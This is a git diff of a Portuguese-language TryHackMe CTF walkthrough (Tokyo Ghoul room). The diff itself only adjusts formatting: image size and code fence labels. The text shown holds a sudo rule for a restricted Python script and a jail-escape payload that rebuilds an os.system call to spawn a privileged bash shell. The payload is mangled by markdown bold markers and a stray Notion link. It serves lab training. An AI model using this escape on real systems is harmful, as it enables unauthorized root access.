@@ -6,6 +6,8 @@ categories: [Walkthrough, Plataforma]
 tags: [writeup, walkthrough, tryhackme, thm, tutorial, hacking, pentest, ctf, capture, flag, linux, medium, médio]
 mermaid: true
 image: https://pm1.narvii.com/6423/6ceaa4749eeb98d7ac41c7b1eead16646c7857be_00.jpg
+  width: 255   # in pixels
+  height: 126   # in pixels
 pin: true
 ---
 
@@ -71,7 +73,7 @@ User kamishiro may run the following commands on vagrant.vm:
     (ALL) /usr/bin/python3 /home/kamishiro/jail.py
 ```
 
-```python
+```python3
 #! /usr/bin/python3
 #-*- coding:utf-8 -*-
 def main():
@@ -96,7 +98,9 @@ Sabemos que temos de alguma forma bypassar a restrição de palavras do script p
 [Escaping Python Jails](https://anee.me/escaping-python-jails-849c65cf306e)
 
 - Comandos: `sudo /usr/bin/python3 /home/kamishiro/jail.py`
-        ```python
-        **__builtins__**.__**dict__**['__**IMPORT__**'.lower()](https://www.notion.so/'OS'.lower()).__**dict__**['SYSTEM'.lower()]('/bin/bash -p')
-        ```
+
+```python3
+**__builtins__**.__**dict__**['__**IMPORT__**'.lower()](https://www.notion.so/'OS'.lower()).__**dict__**['SYSTEM'.lower()]('/bin/bash -p')
+```
+
 ![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/tokyoghoul/Untitled9.png)
